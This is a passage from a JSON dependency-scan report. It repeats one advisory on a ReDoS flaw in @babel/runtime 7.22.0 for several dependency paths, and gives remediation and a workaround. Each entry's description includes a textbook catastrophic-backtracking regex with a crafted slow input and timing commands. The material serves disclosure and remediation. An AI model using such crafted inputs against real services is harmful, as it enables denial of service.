        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-global@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-global@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-nested@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-nested@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-props-sort@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-props-sort@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-rule-value-function@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-rule-value-function@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
